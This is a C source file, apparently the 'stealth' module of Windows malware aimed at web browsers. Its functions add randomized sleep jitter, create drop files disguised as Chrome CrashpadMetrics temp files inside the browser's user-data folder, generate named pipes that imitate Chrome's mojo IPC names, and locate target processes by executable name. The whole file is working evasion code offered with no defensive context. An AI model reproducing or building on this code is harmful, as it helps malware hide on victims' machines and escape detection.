#include "stealth.h"
#include <tlhelp32.h>
#include <shlobj.h>
#include <stdio.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

void jitter_sleep(DWORD min_ms, DWORD max_ms) {
    DWORD range = max_ms - min_ms;
    DWORD rnd;
    BCryptGenRandom(NULL, (PUCHAR)&rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    Sleep(min_ms + (rnd % (range + 1)));
}

void generate_drop_path(char* out_path, DWORD max_len, const char* browser_subdir) {
    wchar_t local_app[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app);

    char local_app_a[MAX_PATH];
    WideCharToMultiByte(CP_UTF8, 0, local_app, -1, local_app_a, MAX_PATH, NULL, NULL);

    DWORD rnd;
    BCryptGenRandom(NULL, (PUCHAR)&rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    // Looks like: %LOCALAPPDATA%\Google\Chrome\User Data\CrashpadMetrics\updater_3a7f.tmp
    snprintf(out_path, max_len, "%s\\%s\\CrashpadMetrics", local_app_a, browser_subdir);
    CreateDirectoryA(out_path, NULL);
    snprintf(out_path, max_len, "%s\\%s\\CrashpadMetrics\\metrics_%04x.tmp",
             local_app_a, browser_subdir, rnd & 0xFFFF);
}

void generate_pipe_name(char* out_name, DWORD max_len, DWORD pid) {
    DWORD rnd;
    BCryptGenRandom(NULL, (PUCHAR)&rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    snprintf(out_name, max_len, "\\\\.\\pipe\\mojo.%lu.%lu.%lu",
             pid, (DWORD)(rnd & 0xFFFFFF), (DWORD)((rnd >> 24) & 0xFF));
}

DWORD find_process_pid(const char* exe_name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exe_name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}
